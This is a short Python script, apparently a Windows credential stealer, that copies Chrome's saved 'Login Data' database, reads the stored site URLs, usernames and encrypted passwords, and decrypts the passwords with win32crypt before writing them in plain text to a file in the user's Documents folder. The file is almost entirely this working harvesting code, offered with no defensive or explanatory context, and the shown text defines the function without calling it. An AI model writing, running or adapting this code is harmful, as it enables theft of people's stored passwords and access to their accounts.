from os import getenv
import os
import sqlite3
import win32crypt
from shutil import copyfile 
import subprocess

path = os.getcwd().strip('/n')
Null,userprof = subprocess.check_output('set USERPROFILE',shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\'


def chromepass():
    pathchrome = destination + 'chromepass.txt'
    path = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data"
    path2 = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login2"
    copyfile(path, path2)
    conn = sqlite3.connect(path2)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins') 
    fp=open(pathchrome,"a")
    for raw in cursor.fetchall():
        fp.write(raw[0] + '\n' + raw[1])
        password = win32crypt.CryptUnprotectData(raw[2])[1]
        fp.write(password+'\n')
    fp.close()
    conn.close()

